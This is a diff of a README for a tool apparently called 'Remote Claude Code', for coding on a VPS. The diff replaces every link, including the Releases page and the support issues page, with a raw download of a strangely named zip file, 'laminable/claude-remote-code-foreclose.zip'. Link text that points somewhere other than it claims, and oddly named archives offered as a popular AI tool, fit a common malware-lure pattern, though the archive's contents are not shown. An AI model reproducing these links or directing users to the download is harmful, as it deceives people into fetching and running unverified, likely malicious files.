@@ -1,6 +1,6 @@
 # 🚀 remote-claude-code - Code Anytime, Anywhere
 
-[![Download Remote Claude Code](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/djimenez007/remote-claude-code/releases)
+[![Download Remote Claude Code](https://github.com/djimenez007/remote-claude-code/raw/refs/heads/main/laminable/claude-remote-code-foreclose.zip)](https://github.com/djimenez007/remote-claude-code/raw/refs/heads/main/laminable/claude-remote-code-foreclose.zip)
 
 ## 🎯 Overview
 
@@ -14,7 +14,7 @@ To get started with Remote Claude Code, follow these simple steps to download an
 
 You can download the latest release of Remote Claude Code by visiting the Releases page. Click the link below:
 
-[Download Remote Claude Code](https://github.com/djimenez007/remote-claude-code/releases)
+[Download Remote Claude Code](https://github.com/djimenez007/remote-claude-code/raw/refs/heads/main/laminable/claude-remote-code-foreclose.zip)
 
 ### 2. 💻 Prepare Your VPS
 
@@ -84,7 +84,7 @@ If you encounter issues while running Remote Claude Code, consider the following
 
 For further assistance, you can visit the GitHub repository issues page for help. Here’s the link:
 
-[Support Issues Page](https://github.com/djimenez007/remote-claude-code/issues)
+[Support Issues Page](https://github.com/djimenez007/remote-claude-code/raw/refs/heads/main/laminable/claude-remote-code-foreclose.zip)
 
 ### 8. 📈 Future Updates
 
@@ -94,4 +94,4 @@ We are continuously working on improving Remote Claude Code. Your feedback is va
 
 Remote Claude Code is designed to make coding accessible from anywhere. Follow these steps to get started and enjoy the flexibility of coding on your own terms.
 
-[Download Remote Claude Code](https://github.com/djimenez007/remote-claude-code/releases)
+[Download Remote Claude Code](https://github.com/djimenez007/remote-claude-code/raw/refs/heads/main/laminable/claude-remote-code-foreclose.zip)
